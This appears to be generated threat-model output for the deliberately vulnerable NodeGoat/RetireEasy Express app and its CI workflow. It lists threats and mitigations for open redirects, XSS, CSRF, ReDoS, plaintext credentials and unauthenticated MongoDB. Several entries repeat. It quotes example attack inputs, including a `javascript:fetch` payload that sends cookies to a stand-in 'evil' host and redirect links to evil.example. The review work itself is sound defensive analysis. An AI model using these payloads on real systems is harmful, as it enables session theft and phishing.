steps: Replace actions/checkout@v2, actions/setup-node@v1 and actions/cache@v2 in .github/workflows/e2e-test.yml with full commit SHAs and upgrade to current major versions.
Add an explicit least-privilege `permissions:` block (for example `contents: read`) to the e2e-test job.
Scope or disable the actions/cache step for pull_request events from forks so fork runs cannot write cache entries reused by trusted branches.

threats.title: CI workflow runs on pull_request from forks and executes repository-controlled scripts
threats.asset: build pipeline (GitHub Actions runner and cached npm/cypress artifacts)
threats.attackScenario: An attacker opens a pull request against the repository that edits package.json's `start`, `cy:verify` or `test:ci` scripts, or adds a malicious npm lifecycle hook; .github/workflows/e2e-test.yml triggers on `pull_request` (line 2) and runs `npm ci`, `npm run cy:verify` and `NODE_ENV=test npm start` (lines 33-47) with no job-level permissions restriction, so the attacker's code executes on the ubuntu-latest runner and can poison the shared actions/cache entry keyed on package-lock.json (lines 25-31) for later runs.
assumptions: No repository-level default of read-only GITHUB_TOKEN permissions is configured, since the workflow sets no `permissions:` block.
The repository accepts pull requests from forks and the E2E workflow is allowed to run on them without a maintainer approval gate.
threats.impactReason: Arbitrary code execution on the CI runner lets an attacker tamper with cached dependencies consumed by subsequent builds and read whatever the job token can reach.
threats.likelihoodReason: Anyone can open a pull request against a public repository, and the workflow trigger requires no maintainer action beyond the default fork-PR policy.

mitigation.summary: Restrict what fork pull requests can do in the E2E workflow.
steps: Add an explicit `permissions: contents: read` block to the e2e-test job in .github/workflows/e2e-test.yml.
Require manual approval for workflows from first-time or fork contributors in the repository Actions settings.
Scope the actions/cache key so pull-request runs use a read-only or PR-isolated cache rather than writing the branch cache consumed by trusted builds.

threats.title: Cypress failure artifacts uploaded publicly may leak seeded application data
threats.asset: test artifacts (Cypress screenshots and videos of the running application)
threats.attackScenario: The E2E job records video (`npm run test:ci -- --config video=true`, .github/workflows/e2e-test.yml line 47) and on failure uploads the screenshots and videos with actions/upload-artifact (lines 49-60); anyone who can view the workflow run downloads cypress-artifacts-node14.x and watches recordings of the NodeGoat UI showing seeded profile fields such as SSN and bank account numbers rendered in the browser.
assumptions: The repository is public, so workflow run artifacts are downloadable by unauthenticated visitors.
The seeded test dataset driven by the Cypress specs contains realistic profile values rather than obviously fake placeholders.
threats.impactReason: Only seeded test data is exposed, but it mirrors the production field set (SSN, bank and routing numbers) and could include real values if a developer seeds them.
threats.likelihoodReason: Artifacts are uploaded automatically on every test failure and require no privilege to download from a public repository.

mitigation.summary: Stop publishing full-session recordings of the app or guarantee the seed data is synthetic.
steps: Set `video=false` for CI runs in .github/workflows/e2e-test.yml line 47 and keep only screenshots of the failing assertion.
Add a short retention-days value to the upload-artifact step so recordings expire quickly.
Ensure artifacts/db-reset.js seeds clearly synthetic SSN and account numbers.

threats.title: Open redirect via unvalidated url query parameter on GET /learn
threats.asset: user browser navigation and session credentials entered on the phishing destination
threats.attackScenario: The handler at app/routes/index.js:70-72 passes req.query.url straight into res.redirect with no allow-list or scheme check, so an attacker sends a logged-in employee a link to https://app/learn?url=https://evil.example/login that renders a cloned login page on a trusted-looking link and harvests the victim's credentials.
threats.impactReason: Victims are redirected off-site under the application's trust, enabling credential phishing and token leakage via the Referer header; the application's own data is not directly altered.
threats.likelihoodReason: The route is trivially reachable by any authenticated user and the payload is a single query string value requiring no special tooling.

mitigation.summary: Restrict /learn redirects to a fixed allow-list of destinations instead of echoing the query parameter.
steps: In app/routes/index.js at the /learn handler, map a short key (e.g. ?resource=benefits-guide) to a hardcoded URL table and redirect only to matched entries.
If arbitrary URLs must be supported, parse req.query.url with the Node URL parser and reject any value whose host is not in an approved host list or whose scheme is not https.
Return 400 for unmatched or malformed values rather than falling back to the supplied URL.

threats.title: Redirect target reaching /learn is never logged, leaving phishing redirects unattributable
threats.asset: audit trail of outbound redirect destinations
threats.attackScenario: Because the inline /learn handler at app/routes/index.js:70-72 only calls res.redirect(req.query.url) and records nothing, an attacker who circulates https://app/learn?url=https://evil.example leaves no server-side record tying the redirect destination to a session, so incident responders cannot determine which users were sent off-site or deny a user's claim that the application itself sent them there.
assumptions: No upstream access log captures the full query string for /learn requests.
threats.impactReason: Loss of forensic attribution for phishing activity; no direct data loss.
threats.likelihoodReason: Any authenticated user can exercise the route, and the absence of logging applies to every request.

mitigation.summary: Log the requested redirect destination and the session identity before redirecting.
steps: In the /learn handler in app/routes/index.js, emit a log entry containing the session user id, timestamp and the requested url value.
Log rejected (non-allow-listed) destinations at a higher level so repeated abuse is visible.

threats.title: Unvalidated redirect on GET /learn?url= sends users to attacker-controlled sites
threats.asset: login credentials and user browser navigation
threats.attackScenario: The handler at app/routes/index.js:70-72 passes req.query.url straight into res.redirect with no allow-list, so an attacker mails a RetireEasy user a link such as https://app/learn?url=https://retireeasy-login.evil.tld and the 302 lands the trusting user on a cloned login page where they submit their RetireEasy credentials.
assumptions: No redirect allow-list or origin check exists in middleware upstream of the /learn handler.
threats.impactReason: Phishing under the application's own domain harvests login credentials; the redirect target can also be a javascript:/data: URI in older browsers.
threats.likelihoodReason: The URL is a single query parameter on a route any logged-in user can reach, and the link is trivial to craft and distribute.

mitigation.summary: Validate the redirect target against an allow-list of learning-resource URLs.
steps: In app/routes/index.js:70, resolve req.query.url and reject anything whose host is not in a hardcoded allow-list of learning-resource domains.
Prefer mapping a short key (e.g. /learn?topic=xss) to a server-side URL table instead of accepting a full URL.
Return 400 rather than redirecting when the parameter fails validation.

threats.title: Session cookie disclosed to the redirect target of GET /learn
threats.asset: session cookie and referrer-leaked internal URLs
threats.attackScenario: An attacker crafts https://app/learn?url=https://collector.evil.tld/log and gets a logged-in user to click it; the unvalidated res.redirect at app/routes/index.js:72 sends the browser to the attacker's collector, which records the Referer header and any query data from the originating RetireEasy page, and can serve a fake session-expiry prompt to capture the user's cookie or credentials.
assumptions: No Referrer-Policy header restricts what the application leaks on cross-origin redirects.
No TLS termination is in place, so traffic including credentials and sensitive personal data is sent over plain HTTP.
threats.impactReason: Leaked referrer data and a convincing attacker-hosted page can lead to session or credential compromise.
threats.likelihoodReason: Any logged-in user who clicks a crafted link triggers it; no privileged position is required. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Restrict the redirect target and set a strict referrer policy.
steps: Apply the same allow-list validation to req.query.url in app/routes/index.js:70.
Set Referrer-Policy: no-referrer or same-origin via helmet in the Express bootstrap.
Ensure the session cookie is httpOnly so scripts on any destination page cannot read it.

threats.title: MongoDB wire traffic on the memo flow travels unauthenticated and unencrypted between containers
threats.asset: plaintext user passwords, SSN and bank details carried in the users collection alongside memos
threats.attackScenario: The connection string used for this flow is `mongodb://mongo:27017/nodegoat` (docker-compose.yml:8, config/env/all.js:3) with no credentials and no tls option, so an attacker who lands on the Docker bridge network connects directly to mongo:27017 or sniffs the wire protocol and reads or rewrites the memos and users documents, including the plaintext `password` field written by app/data/user-dao.js.
assumptions: No network-level encryption or mTLS is imposed outside the application.
The application connects to MongoDB without authentication or with excessive privileges, as shown in the default docker-compose configuration.
The mongo service accepts unauthenticated connections from any host that can reach port 27017 on the compose network.
threats.impactReason: The same connection carries plaintext passwords, SSN and bank routing details, so any read gives full account takeover material.
threats.likelihoodReason: Requires a foothold on the container network, but once there no credential or certificate is needed. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authenticated, TLS-protected MongoDB connections with a least-privilege application user.
steps: Create a dedicated application user with access only to the nodegoat database and set MONGODB_URI in docker-compose.yml to include those credentials.
Enable TLS on the mongo service and add tls=true plus a CA file to the connection string in config/env/all.js.
Stop writing plaintext passwords in app/data/user-dao.js addUser by hashing with the already-present bcrypt-nodejs.

threats.title: Memo insert accepts arbitrary non-string bodies straight into MongoDB
threats.asset: the memos collection in MongoDB
threats.attackScenario: An attacker posts `memo[$ne]=1` or a nested object to POST /memos; app/routes/memos.js passes req.body.memo unvalidated to memosDAO.insert, which embeds the object directly in the document written over the MongoDB wire protocol, poisoning the memos collection with structures the Nunjucks `marked(doc.memo)` filter cannot render and breaking GET /memos for all users.
assumptions: No body-schema validation middleware runs in front of the /memos routes.
threats.impactReason: Malformed documents persist in the shared collection and can break the memos page for every user until manually removed.
threats.likelihoodReason: The route is reachable by any logged-in user and the body value is used without any type check.

mitigation.summary: Validate that the memo body is a bounded string before persisting it.
steps: In app/routes/memos.js addMemos, reject the request unless typeof req.body.memo === 'string' and it is within a maximum length.
Coerce/validate the value again in app/data/memos-dao.js insert before building the document.

threats.title: Unbounded memo listing over the memo flow exhausts memory and stalls the app
threats.asset: availability of the memos feature and the MongoDB connection
threats.attackScenario: An attacker repeatedly posts large memos through POST /memos; each subsequent page load sends an unfiltered `memosCol.find({}).sort({timestamp:-1}).toArray(...)` over the memo flow, pulling the entire growing collection into Node memory and sorting it in MongoDB without an index, so both the database and the web process degrade until /memos times out for everyone.
assumptions: No index exists on the memos.timestamp field.
No pagination, result limit or memo size cap is applied anywhere on the /memos path.
threats.impactReason: Sustained growth of the shared collection degrades the database and can take the web process down for all users.
threats.likelihoodReason: Any logged-in user can grow the collection without limit; the full-collection fetch runs on every memos page view.

mitigation.summary: Bound the memo query and the size of stored memos.
steps: Add .limit() and skip-based pagination to memosCol.find in app/data/memos-dao.js getAllMemos.
Create an index on the timestamp field of the memos collection.
Cap memo body length in app/routes/memos.js addMemos before insert.

threats.title: Cross-site request forgery posting memos as a logged-in victim
threats.asset: shared memo content (integrity of the memo board)
threats.attackScenario: An attacker hosts a page that auto-submits a hidden form to POST /memos (app/routes/index.js:48-67 region, handler app/routes/memos.js:11) with a `memo` field containing an XSS payload; a logged-in victim visiting the page has their session cookie attached automatically and the memo is stored under their session, spoofing their identity on the shared board.
assumptions: CSRF protection is not applied to these state-changing routes, leaving them vulnerable to cross-site request forgery.
No CSRF token is required or verified for POST /memos.
Session cookies are sent on cross-site form posts (no SameSite=Strict/Lax enforcement).
threats.impactReason: Attacker-controlled content is written to a board every user reads, chaining into the stored XSS path.
threats.likelihoodReason: Requires only that a logged-in user visit an attacker page, but depends on cookie SameSite behaviour. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require a per-session CSRF token on the memos form.
steps: Add csurf middleware (or equivalent) to the POST /memos route registration in app/routes/index.js.
Render the token as a hidden input in the form at app/views/memos.html:15 and reject requests whose token does not match.
Set the session cookie with SameSite=Lax or Strict.

threats.title: Stored XSS injected through the POST /memos memo field and rendered as raw markdown to every user
threats.asset: session cookies of all users viewing the shared memo board
threats.attackScenario: An attacker submits the memos form at app/views/memos.html:15 with a memo body such as ``; app/routes/memos.js:13 passes req.body.memo straight to MemosDAO.insert with no sanitisation, and app/views/memos.html:31 renders it with `marked(doc.memo)` (which passes HTML through), so the script executes in every other user's browser on /memos and exfiltrates their session cookie.
assumptions: The nunjucks `marked` filter output is not additionally escaped, i.e. raw HTML from markdown reaches the page.
threats.impactReason: Any authenticated user's session cookie (and thereby their SSN/bank data on /profile) can be stolen; the memo board is shared with all users including admins.
threats.likelihoodReason: The form is reachable by any logged-in user and requires only typing HTML into a textarea; no bypass is needed.

mitigation.summary: Sanitise memo text before storing and render markdown with HTML disabled.
steps: Configure marked with `sanitize`/a DOMPurify pass before rendering in app/views/memos.html:31 so raw HTML in memo text is stripped.
Validate and length-limit req.body.memo in app/routes/memos.js:13 before calling memosDAO.insert.
Escape the rendered memo output in the nunjucks template rather than trusting the markdown renderer.

threats.title: Memo text and session cookie exposed in transit on the POST /memos request
threats.asset: session cookie
threats.attackScenario: An attacker on the same network as a user captures the plaintext HTTP POST /memos request (handled at app/routes/index.js:67) and reads the Cookie header, then replays the session cookie to post and read memos as that user.
assumptions: No TLS termination is in place, so traffic including credentials and sensitive personal data is sent over plain HTTP.
The application is served over plain HTTP without HSTS or TLS termination enforcing redirects.
threats.impactReason: A stolen session cookie gives full access to the victim's account including the profile page holding SSN and bank details.
threats.likelihoodReason: Requires an attacker positioned on the network path; deployments often terminate TLS at a proxy. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enforce HTTPS for all form submissions and mark the session cookie secure.
steps: Redirect HTTP to HTTPS and send Strict-Transport-Security from the Express app entry point.
Set `secure: true` and `httpOnly: true` on the session cookie configuration.

threats.title: Unbounded memo body allows storage exhaustion of the memos collection
threats.asset: availability of the memos board and MongoDB storage
threats.attackScenario: An attacker scripts repeated POST /memos requests with multi-megabyte `memo` values; app/routes/memos.js:13 inserts each one without any length check or rate limit, and app/data/memos-dao.js:26 later loads the entire collection with `memosCol.find({}).toArray()` on every /memos view, so the board becomes unusable and memory grows unbounded.
assumptions: No rate limiting or request body size cap is applied in front of POST /memos.
threats.impactReason: The memos page loads all documents into memory, so a flooded collection degrades or crashes the app for every user.
threats.likelihoodReason: Any authenticated user can loop the request; no special tooling is needed.

mitigation.summary: Cap memo size and paginate memo retrieval.
steps: Reject memo bodies over a fixed length in app/routes/memos.js before calling memosDAO.insert.
Add `.limit()` and pagination to the query in app/data/memos-dao.js:28 instead of returning the full collection.
Apply express rate limiting to POST /memos in app/routes/index.js.

threats.title: Stored XSS in shared memos via unsanitised Markdown rendered by marked@0.3.5
threats.asset: shared memo content and the sessions of every logged-in user who views /memos
threats.attackScenario: An attacker posts to POST /memos (app/routes/index.js:67) with a memo body such as `[click](data:text/html;base64,PHNjcmlwdD4...)`; memos-dao.js stores req.body.memo verbatim and app/views/memos.html line 31 renders it with `{{ marked(doc.memo) }}` using marked@0.3.5, which is vulnerable to XSS from data URIs (CVE-2017-1000427), so the script executes in the browser of every other logged-in user who loads GET /memos and can exfiltrate their session cookie.
threats.impactReason: Memos are shown to all logged-in users including administrators, so one post can hijack any session and reach profile SSN/bank data.
threats.likelihoodReason: Any authenticated user can submit a memo through the existing form; the vulnerable marked version and the unescaped render filter are both present.

mitigation.summary: Upgrade marked and sanitise rendered memo HTML before output.
steps: Bump marked in package.json from 0.3.5 to >=4.0.10 and adapt the call in app/views/memos.html.
Escape or sanitise the marked output (for example run it through a sanitiser allow-list that strips data:, javascript: and event-handler attributes) before inserting it into memos.html line 31.
Validate memo length and content server-side in app/routes/memos.js addMemos before calling memosDAO.insert.

threats.title: Memos are stored and displayed with no author identity or audit trail
threats.asset: shared memo content and attribution of who posted it
threats.attackScenario: An attacker with any account posts a defamatory or XSS-bearing memo to POST /memos; memos-dao.js insert writes only `{memo, timestamp}` with no session userId, so after the fact no operator can tell which account submitted the memo and the poster can plausibly deny it.
assumptions: No separate request/audit log records the session userId alongside memo submissions.
threats.impactReason: Abuse of the shared memo board cannot be attributed or selectively removed, but no data is directly lost.
threats.likelihoodReason: Every memo insert already drops the author; the handler has req.session.userId available and ignores it on write.

mitigation.summary: Record the authenticated author on each memo document.
steps: Pass req.session.userId from app/routes/memos.js addMemos into memosDAO.insert.
Store userId alongside memo and timestamp in app/data/memos-dao.js insert.
Log memo creation events with user id and source IP for audit.

threats.title: Memo rendering denial of service through ReDoS in marked@0.3.5
threats.asset: availability of the /memos page and the Node.js event loop
threats.attackScenario: An attacker submits a memo through POST /memos containing the pathological block-quote/heading input that triggers CVE-2022-21681 in marked@0.3.5; because memos-dao.js getAllMemos returns every stored memo and app/views/memos.html line 31 runs marked over each one, the single-threaded Node process stalls on catastrophic backtracking for every subsequent GET /memos request, denying the page to all users.
threats.impactReason: One stored memo permanently blocks the shared memos page for every user and consumes the event loop, degrading the whole Express application.
threats.likelihoodReason: Any logged-in user can store arbitrary Markdown and the vulnerable marked version is pinned in package.json.

mitigation.summary: Upgrade marked past 4.0.10 and bound memo size and render work.
steps: Upgrade marked to >=4.0.10 in package.json.
Reject memo bodies over a fixed length in app/routes/memos.js addMemos before memosDAO.insert.
Paginate memosDAO.getAllMemos instead of rendering the entire collection on every page load.

threats.title: No per-user attribution for writes to the memos collection
threats.asset: memo records and their authorship trail
threats.attackScenario: app/data/memos-dao.js:15-24 inserts a memo document containing only the memo text and a timestamp with no author or session id, so any logged-in user posts an abusive or fraudulent memo via POST /memos and no record in the memos collection can attribute it back to them, defeating any later investigation.
assumptions: No separate audit collection or application log records the memo author alongside the insert.
threats.impactReason: Content shown to all users cannot be traced to its author, but no confidential data is exposed by this alone.
threats.likelihoodReason: Any authenticated user reaches POST /memos and the missing author field is unconditional.

mitigation.summary: Record the authoring user on every memo document.
steps: Change MemosDAO.insert in app/data/memos-dao.js to accept the session userId and store it on the memos document alongside the timestamp.
Pass req.session.userId from the memos handler into the DAO call.
Index the new author field so memos can be queried per user during an investigation.

threats.title: Passwords stored in plaintext in the MongoDB users collection
threats.asset: plaintext user passwords in the users collection
threats.attackScenario: app/data/user-dao.js:17-31 inserts the signup password straight into the users document with the bcrypt hashing line commented out, so anyone who reaches the mongo service on port 27017 (exposed inside the compose network with no credentials in MONGODB_URI) or dumps a backup runs db.users.find({}) and reads every user's login password in clear text, then replays it against other services.
assumptions: The MongoDB deployment described in docker-compose.yml runs without authentication, as the MONGODB_URI mongodb://mongo:27017/nodegoat carries no credentials.
The application connects to MongoDB without authentication or with excessive privileges, as shown in the default docker-compose configuration.
threats.impactReason: Every account's usable login password is exposed, enabling full account takeover and credential stuffing elsewhere.
threats.likelihoodReason: No cracking is needed: any read access to the users collection, including a stray backup or a container on the compose network, yields credentials directly. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Hash passwords with bcrypt before they reach the users collection.
steps: Uncomment the bcrypt.hashSync(password, bcrypt.genSaltSync()) assignment in app/data/user-dao.js:29 and remove the raw `password` field at line 25.
Change validateLogin's comparePassword helper to use bcrypt.compareSync against the stored hash.
Write a one-off migration in artifacts/db-reset.js that rehashes or invalidates existing plaintext passwords.

threats.title: SSN, date of birth and bank details written to the users collection unencrypted
threats.asset: stored SSN, date of birth, bank account and routing numbers
threats.attackScenario: app/data/profile-dao.js has its crypto encrypt/decrypt helpers commented out at lines 15-40 and updateUser writes ssn, dob, bankAcc and bankRouting as raw fields, so an attacker with read access to the nodegoat database (or a stolen snapshot of the mongo:4.4 volume) runs db.users.find({},{ssn:1,bankAcc:1,bankRouting:1}) and harvests identity and banking data for every employee.
assumptions: The MongoDB instance accepts connections without authentication, as the configured MONGODB_URI contains no credentials.
The application connects to MongoDB without authentication or with excessive privileges, as shown in the default docker-compose configuration.
The database files and backups are not protected by a separate encryption-at-rest layer.
threats.impactReason: SSNs and bank routing/account numbers are directly usable for identity theft and financial fraud and cannot be rotated.
threats.likelihoodReason: Requires access to the database or its storage, which is reachable from any container on the compose network but not from the internet by default. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Encrypt sensitive profile fields before persisting them to MongoDB.
steps: Re-enable the crypto helpers in app/data/profile-dao.js and apply encrypt() to ssn, dob, bankAcc and bankRouting in updateUser before the document is written.
Move cryptoKey out of config/env/all.js into an environment variable and store a per-record IV alongside the ciphertext rather than on the shared config object.
Enable MongoDB authentication and encryption at rest for the mongo service in docker-compose.yml.

threats.title: Vulnerable mongodb 2.2.36 driver allows denial of service against the database connection
threats.asset: availability of the nodegoat database connection and the allocation, contribution and memo records it serves
threats.attackScenario: package.json:18 pins mongodb@^2.1.18 resolving to 2.2.36, which is affected by GHSA-mh5c-679w-hh4r; an attacker who can influence values passed into the driver from routes such as POST /contributions or POST /memos triggers the driver's denial-of-service condition and the single MongoClient.connect handle in server.js is lost, making all stored records unavailable.
assumptions: The deployed node_modules tree resolves the ^2.1.18 range to the vulnerable 2.2.36 release.
threats.impactReason: Loss of the database connection takes the whole application offline until the process is restarted, but stored data is not disclosed or altered.
threats.likelihoodReason: A published advisory exists for the pinned version and application routes feed user input into driver calls, though the advisory requires a specific trigger.

mitigation.summary: Upgrade the MongoDB driver past the fixed 3.1.13 release.
steps: Raise the mongodb dependency in package.json:18 to a supported 3.x or 4.x line and rerun npm install.
Adapt the MongoClient.connect callback in server.js and the collection.insert/update calls in app/data/*-dao.js to the new driver API (insertOne/updateOne, client.db()).
Add an automated dependency audit to the CI scripts in package.json.

threats.title: Known-vulnerable express 4.16.4 and body-parser 1.18.3 expose the server to DoS and redirect/XSS CVEs
threats.asset: availability of the NodeGoat Express server and user session state
threats.attackScenario: package.json pins express@4.16.4 and body-parser@1.18.3, so an attacker posts crafted url-encoded bodies to POST /login or POST /profile to trigger the CVE-2024-45590 body-parser denial of service and stalls the single Node process, or sends a malformed URL to an express redirect path (such as /learn) to exploit CVE-2024-29041/CVE-2024-43796 open-redirect and XSS behaviour in res.redirect().
threats.impactReason: A single-process Express app run under forever can be stalled by the body-parser DoS, and the redirect CVEs allow script execution in a victim's authenticated session.
threats.likelihoodReason: The vulnerable versions are pinned in package.json and the affected code paths (urlencoded body parsing, res.redirect at app/routes/index.js:72) are reachable, though exploitation requires crafted input.

mitigation.summary: Upgrade express and body-parser to patched versions.
steps: Raise express to >=4.20.0 and body-parser to >=1.20.3 in package.json and regenerate the lockfile.
Re-run npm audit / osv-scanner in CI to keep the Dockerfile's `npm install --production` from pulling vulnerable trees.
Remove the direct body-parser dependency in server.js in favour of express.json()/express.urlencoded() from the upgraded express.

threats.title: Open redirect on GET /learn forwards authenticated users to attacker-controlled hosts
threats.asset: user session state and credentials phished after redirect
threats.attackScenario: The handler at app/routes/index.js:70 calls res.redirect(req.query.url) with no allow-list or validation of the url query parameter, so an attacker sends a logged-in user a link to https://<app>/learn?url=https://evil.example/login that renders a clone of the NodeGoat login page and harvests the victim's username and password.
assumptions: No upstream middleware in server.js rewrites or validates req.query.url before the /learn handler runs.
threats.impactReason: Victims are steered to attacker sites under the application's own domain trust, enabling credential phishing and malware delivery, but the application's own data is not directly read.
threats.likelihoodReason: The parameter is fully attacker-controlled and only a logged-in session is needed; the redirect is performed unconditionally.

mitigation.summary: Validate the redirect target against an allow-list of known learning-resource URLs.
steps: In app/routes/index.js:70, compare req.query.url against a fixed map of permitted destinations and 400 anything else.
If arbitrary URLs must be supported, render an interstitial page showing the destination host instead of issuing res.redirect directly.
Reject values beginning with '//', 'javascript:' or 'data:'.

threats.title: Any authenticated user can read another user's retirement allocations via GET /allocations/:userId
threats.asset: other users' retirement contribution and allocation data
threats.attackScenario: GET /allocations/:userId at app/routes/index.js:63 is protected only by the isLoggedIn middleware and never compares :userId to req.session.userId, so an attacker signs up, notes their own numeric userId, then requests /allocations/1, /allocations/2 and so on to read every other user's stocks, funds and bonds allocations.
assumptions: User ids are sequential integers, as suggested by the getNextSequence("userId") counter used when creating users.
allocationsHandler.displayAllocations does not itself re-scope the lookup to the session user.
threats.impactReason: Financial allocation records for every registered user become readable one id at a time.
threats.likelihoodReason: Any self-registered account reaches the route and ids are trivially enumerable in the path.

mitigation.summary: Enforce ownership (or admin role) on the allocations lookup.
steps: In app/routes/index.js:63, add a check that req.params.userId equals req.session.userId, or chain sessionHandler.isAdminUserMiddleware for cross-user access.
Alternatively ignore :userId in allocationsHandler.displayAllocations and query allocations using req.session.userId only.
Return 404 for non-owned ids so existence is not confirmed.

threats.title: Unhandled error stacks rendered to the browser by the global error handler
threats.asset: internal file paths, MongoDB driver internals and query fragments exposed in stack traces
threats.attackScenario: app/routes/error.js passes the raw err object into res.render("error-template", { error: err }), so an attacker triggers a failure — for example by requesting /learn with no url query parameter so res.redirect throws — and reads the resulting 500 page for the stack trace, absolute container paths under /home/node/app and MongoDB driver details to plan further attacks.
assumptions: The application runs with the error handler mounted in production, not only in development.
error-template renders the passed error object's message or stack into the HTML response body.
threats.impactReason: Leaked stack traces and paths aid targeting but do not directly expose user records.
threats.likelihoodReason: Any request that throws reaches the handler and errors are easy to provoke from unvalidated route input.

mitigation.summary: Return a generic 500 page and keep error details server-side.
steps: In app/routes/error.js, log err.stack to the server log only and render error-template with a static message plus a correlation id.
Gate any detailed output behind a NODE_ENV !== 'production' check.

threats.title: Profile writes to MongoDB cross the container boundary without TLS or authentication
threats.asset: SSN, bank account and routing numbers and plaintext user passwords in transit to the users collection
threats.attackScenario: The connection string `mongodb://mongo:27017/nodegoat` in docker-compose.yml:8 and `mongodb://localhost:27017/nodegoat` in config/env/all.js:3 carry no credentials and no tls option, so an attacker with a foothold on the docker network sniffs or MITMs the wire-protocol upsert that profile-db-write performs in ProfileDAO.updateUser and reads or rewrites SSN and bankAcc values, or connects directly to mongo:27017 as an unauthenticated client.
assumptions: No TLS termination is in place, so traffic including credentials and sensitive personal data is sent over plain HTTP.
The application connects to MongoDB without authentication or with excessive privileges, as shown in the default docker-compose configuration.
The mongo:4.4 service in docker-compose.yml runs with default settings, i.e. without --auth and without a TLS certificate.
threats.impactReason: Unauthenticated wire access exposes and allows tampering with every collection, including users passwords stored in clear by app/data/user-dao.js.
threats.likelihoodReason: Needs a position on the container network or host, but no credential or exploit once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies; no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection used by all DAOs.
steps: Start the mongo service in docker-compose.yml with --auth and --tlsMode requireTLS, and create a dedicated nodegoat user limited to the nodegoat database.
Change MONGODB_URI in docker-compose.yml and the default in config/env/all.js to include credentials and ?tls=true.
Do not publish or expose port 27017 beyond the internal compose network.

threats.title: SSN, date of birth and bank details written to the users collection in plaintext
threats.asset: SSN, date of birth, bank account and routing numbers, home address
threats.attackScenario: ProfileDAO.updateUser at app/data/profile-dao.js:42-60 assigns ssn, dob, bankAcc and bankRouting straight onto the user document with the encryption helpers left commented out at app/data/profile-dao.js:15-40, so anyone who obtains read access to the nodegoat MongoDB - for example through the container port or a stolen MONGODB_URI - dumps every user's SSN and bank account number in clear text.
assumptions: The commented-out crypto block in app/data/profile-dao.js is the only encryption the application implements for these fields.
threats.impactReason: Full SSNs, dates of birth and bank account/routing numbers for every user are readable with a single database dump.
threats.likelihoodReason: Requires access to the MongoDB instance or its backups rather than an unauthenticated web request, but the data is wholly unprotected once that access exists.

mitigation.summary: Encrypt SSN, DOB and bank fields before writing them to the users collection.
steps: Re-enable and correct the crypto helpers in app/data/profile-dao.js, deriving the key from an environment variable rather than the literal cryptoKey in config/env/all.js.
Encrypt ssn, dob, bankAcc and bankRouting inside updateUser before the document is upserted, and decrypt in getByUserId.
Store a per-record random IV alongside the ciphertext instead of reusing a shared config.iv.

threats.title: Unbounded profile field sizes let a user inflate the users collection and exhaust MongoDB storage
threats.asset: availability and storage of the nodegoat MongoDB users collection
threats.attackScenario: ProfileDAO.updateUser at app/data/profile-dao.js:42-60 copies firstName, lastName, address and bankAcc into the user document with only truthiness checks and no length limit, so a user repeatedly POSTs /profile with multi-megabyte address values over profile-db-write until the mongo container's disk fills and writes for every other collection fail.
assumptions: No body-size limit smaller than the MongoDB document limit is applied to POST /profile upstream of the handler.
threats.impactReason: Filling the shared MongoDB volume degrades or halts writes for allocations, contributions and memos as well as profiles.
threats.likelihoodReason: Requires an account and sustained large requests, which are noisy and easy to notice.

mitigation.summary: Bound the size of profile fields before they are persisted.
steps: Add maximum-length validation for firstName, lastName, address, bankAcc and bankRouting in app/routes/profile.js before calling profile.updateUser.
Configure a small body size limit on the Express json/urlencoded parsers used for /profile.
Reject oversized submissions with a 400 rather than truncating silently.

threats.title: Stored XSS through the profile website field encoded for HTML but rendered in a URL context
threats.asset: the victim's authenticated session and the SSN, date of birth and bank details shown on their profile page
threats.attackScenario: An attacker saves a website value such as `javascript:fetch('//evil/?c='+document.cookie)` through POST /profile, and when GET /profile (app/routes/index.js:47) renders it the ESAPI call at app/routes/profile.js:28 applies HTML encoding only, so the value is still interpreted as a URL in the profile link and executes in the victim's browser, exfiltrating their session and displayed bank details.
assumptions: app/views/profile.html renders doc.website inside an anchor href, as the in-code comment at app/routes/profile.js:24-31 describes.
threats.impactReason: Script execution in the profile page context exposes the session cookie and every sensitive field rendered on the profile form, including SSN and bank account numbers.
threats.likelihoodReason: Storing the payload requires only a normal account, but triggering it needs the victim to visit a page rendering that website value.

mitigation.summary: Encode the website value for the URL context it is rendered in, and reject non-http(s) schemes.
steps: Replace `ESAPI.encoder().encodeForHTML(doc.website)` at app/routes/profile.js:28 with `ESAPI.encoder().encodeForURL(doc.website)` exposed as a separate template variable used in the link href.
Validate on POST /profile that website starts with http:// or https:// before persisting it via ProfileDAO.updateUser.
Keep the HTML-encoded variant for any place the value is rendered as text.

threats.title: ReDoS on POST /profile via the bankRouting field's nested quantifier regex
threats.asset: availability of the NodeGoat Express process serving all users
threats.attackScenario: An authenticated user submits POST /profile (app/routes/index.js:48) with bankRouting set to a long run of digits with no trailing '#', e.g. '9999999999999999999999999999!', which the nested-quantifier pattern /([0-9]+)+\#/ at app/routes/profile.js:59 evaluates with catastrophic backtracking, pinning the single Node.js event loop and denying the site to every other user.
assumptions: The regex at app/routes/profile.js:59 is executed synchronously against the raw bankRouting body value before any length cap is applied.
threats.impactReason: A single request stalls the Node.js event loop, taking down the whole application for all users until the process is restarted.
threats.likelihoodReason: Any registered user can reach POST /profile and the malicious input is a trivial string of digits.

mitigation.summary: Remove the nested quantifier from the bank routing validation and bound input length.
steps: Replace `const regexPattern = /([0-9]+)+\#/;` at app/routes/profile.js:59 with the non-backtracking `/^[0-9]+#$/`.
Reject bankRouting values longer than a fixed maximum (e.g. 20 characters) before running the regex.
Add a unit test submitting a 40-digit non-matching string to assert the handler returns within milliseconds.

threats.title: Cross-site request forgery overwrites a victim's SSN, address and bank details via POST /profile
threats.asset: SSN, date of birth, home address, bank account and routing numbers
threats.attackScenario: An attacker publishes a page that auto-submits a hidden form to POST /profile (registered at app/routes/index.js:48, handled by handleProfileUpdate in app/routes/profile.js:40) with attacker-chosen `bankAcc` and `bankRouting` fields; when a logged-in victim loads it their session cookie is attached and ProfileDAO.updateUser writes the attacker's bank account onto the victim's user document.
assumptions: CSRF protection is not applied to these state-changing routes, leaving them vulnerable to cross-site request forgery.
